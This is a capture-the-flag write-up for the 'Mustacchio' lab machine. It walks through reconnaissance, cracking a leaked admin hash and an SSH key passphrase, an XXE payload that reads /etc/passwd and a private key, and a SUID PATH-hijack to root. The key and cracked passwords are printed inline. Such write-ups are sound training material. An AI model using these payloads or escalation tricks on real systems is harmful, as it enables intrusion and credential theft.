# Mustacchio V2 Write-up: Easy

## Nmap

```
nmap -sC -sV <ip> -p-
```

Open ports:
- 22: ssh. OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
- 80: http. Apache httpd 2.4.18 ((Ubuntu))
- 8765: http. Nginx 1.10.3 (Ubuntu). Title: Mustacchio | Login

None of the versions appear to be vulnerable.

## Gobuster

### Port 80: Blog
```
gobuster dir -e -u <ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

Interesting directories:
- /robots.txt (nothing useful)
- /custom

Looking in the custom directory found the css and js directories. js contained an SQL backup file users.bak which after running strings gave me the following hashed credentials:
**admin : 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b**

### Port 8765: Admin login
```
gobuster dir -e -u http://<ip>:8765 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

Interesting directories:
- /auth (301: Forbidden)
- /home.php (admin page)
- /index.php (login page)

## John the Ripper and Admin login

Running John the Ripper on the backup file hash quickly found the password:
```
john --wordlist=rockyou.txt hash
```
**admin : bulldog19**

This allowed me to login as admin at http://$ip:8765, which led me to an admin panel where I could add a comment to the website. Looking at the source code revealed 3 interesting things:

1) The comment 'Barry, you can now SSH in using your key!' 
2) The presence of a file '/auth/dontforget.bak'
3) The 'add comment' feature parses the input as xml code

Checking the dontforget.bak file returned some xml code:
```
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>...</com>
</comment>
```

Using BurpSuite, I found that the data entered into the comment box is passed as an xml parameter. Providing the above code as a parameter mirrors the data back to me, a good indication there could be an XXE vulnerability.

## XXE to get the ssh key

I tested the following xml code to see if I could read the /etc/passwd file:
```
xml=<!DOCTYPE+replace+[<!ENTITY+name+SYSTEM+'file%3a///etc/passwd'>+]>
<comment>
++<name>%26name%3b</name>
++<author>Barry Clad</author>
++<com>...</com>
</comment>
```

And it worked! Three users have bash on the system: root, joe, and barry.
Previous information told me barry has an ssh key, so I looked in /home/barry/.ssh and found it

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----
```

## John the Ripper to decrypt the ssh key

```
ssh2john key > johnkey
john --wordlist=rockyou.txt johnkey
```

This quickly cracked the credentials:
**barry : urieljames**

## SSH: First flag

```
chmod 600 key
ssh barry@$ip -i key
```

After giving the key the correct permissions I logged into ssh with barry's private key. This gave me the first flag from Barry's home directory.

## Privilege Escalation to root: SETUID and PATH exploitation

Looking for SETUID binaries:

```
find / -perm -u=s -type f 2>/dev/null 
```

Found an interesting file: **/home/joe/live_log**

Running strings shows it is using the tail command, so we could write our own in the /tmp directory and change PATH to run our own script instead.

```
cd /tmp
vim tail
export PATH=/tmp:$PATH
chmod +x /tmp/tail
cd /home/joe
./live_log
```

Where the new tail command contains the following script to simply invoke bash:
```
#!/bin/bash
/bin/bash
```

And now we have root! This works because live_log will look for the 'tail' command in the /tmp directory first, and execute our script which invokes bash. Since the file is SETUID, bash is invoked as the root user instead of barry, thereby escalating our privileges.

```
cd /root
cat root.txt
```
And now we have our final flag!
